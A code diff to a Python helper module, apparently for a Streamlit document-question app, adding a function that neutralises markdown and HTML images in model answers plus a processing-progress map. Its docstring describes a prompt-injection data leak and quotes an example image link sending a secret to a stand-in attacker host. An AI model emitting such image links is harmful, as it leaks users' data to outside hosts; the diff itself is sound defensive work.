@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import re
 from typing import Any
 
 IN_FLIGHT = {
@@ -96,3 +97,33 @@ def answer_notices(response: dict[str, Any]) -> list[tuple[str, str]]:
 def preview_title(text: str, limit: int = 40) -> str:
     one_line = " ".join(text.split())
     return one_line if len(one_line) <= limit else one_line[: limit - 1] + "…"
+
+
+_IMAGE = re.compile(r"!\[")
+_HTML_IMG = re.compile(r"<\s*img", re.IGNORECASE)
+
+
+def safe_markdown(text: str) -> str:
+    """Model answers and document excerpts are untrusted. Streamlit already escapes HTML, but
+    markdown images would still make the browser fetch an outside URL as soon as the answer is
+    shown, a classic way to leak data through a prompt-injected document
+    (`![x](https://attacker/?q=<secret>)`). Images are therefore shown as text, never loaded;
+    ordinary links stay clickable but are never fetched on their own."""
+    return _HTML_IMG.sub("&lt;img", _IMAGE.sub(r"!\[", text))
+
+
+STAGE_PROGRESS = {
+    "pending": 0.05,
+    "validating": 0.1,
+    "queued": 0.15,
+    "processing": 0.25,
+    "extracting": 0.4,
+    "chunking": 0.6,
+    "embedding": 0.75,
+    "indexing": 0.9,
+}
+
+
+def stage_progress(status: str) -> float:
+    """How far along a document is, for the progress bar while it is processed (KI-049)."""
+    return STAGE_PROGRESS.get(status, 1.0 if status == "completed" else 0.0)
